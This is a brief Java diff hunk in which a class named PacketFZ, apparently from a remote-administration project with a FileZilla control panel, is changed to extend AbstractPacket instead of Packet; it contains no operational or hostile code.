@@ -4,7 +4,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlFileZilla;
 
-public class PacketFZ extends Packet {
+public class PacketFZ extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
